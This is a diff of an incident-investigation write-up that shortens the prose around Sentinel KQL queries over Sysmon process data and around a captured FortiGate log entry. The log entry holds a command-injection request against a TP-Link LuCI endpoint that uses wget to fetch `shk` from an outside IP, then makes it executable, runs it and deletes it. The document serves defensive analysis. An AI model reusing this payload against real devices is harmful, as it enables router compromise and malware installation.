@@ -7,7 +7,7 @@ Sysmon
 | where CommandLine contains "whoami"
 ```
 
-This query searches Sysmon process telemetry for command lines containing `whoami`. The command is not malicious by itself; it becomes meaningful when correlated with the parent process, user, timing, and surrounding activity.
+This query finds `whoami` in Sysmon process telemetry. The command becomes meaningful when correlated with parent process, user, timing, and surrounding activity.
 
 ## Sentinel Process Field Review
 
@@ -28,7 +28,7 @@ Sysmon
 | order by TimeGenerated asc
 ```
 
-This version keeps the investigation focused on the log fields that matter most for process analysis: process image, command line, parent process, parent command line, process ID, parent process ID, user, endpoint, and timestamp.
+This version keeps the key process-analysis fields: image, command line, parent process, process IDs, user, endpoint, and timestamp.
 
 ## Sentinel Timeline Expansion
 
@@ -51,7 +51,7 @@ Sysmon
 | order by TimeGenerated asc
 ```
 
-This expanded query is used to move from a single discovery command to the surrounding endpoint story: Excel opening `Gift.xlsm`, `curl` downloads, domain-controller ping checks, cleanup utilities, and related command-line activity.
+This expanded query connects `whoami` to the wider endpoint timeline: `Gift.xlsm`, `curl`, domain-controller pings, cleanup utilities, and related command-line activity.
 
 ## FortiGate Request Command Chain
 
@@ -59,4 +59,4 @@ This expanded query is used to move from a single discovery command to the surro
 /cgi-bin/luci/;stok\=/locale?form\=country&operation\=write&country\=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
 ```
 
-The request attempts to run `id`, change into `/tmp`, download `shk`, make it executable, execute it with a `tplink` argument, and remove it afterward.
+The request runs `id`, changes into `/tmp`, downloads `shk`, makes it executable, runs it with `tplink`, and removes it.
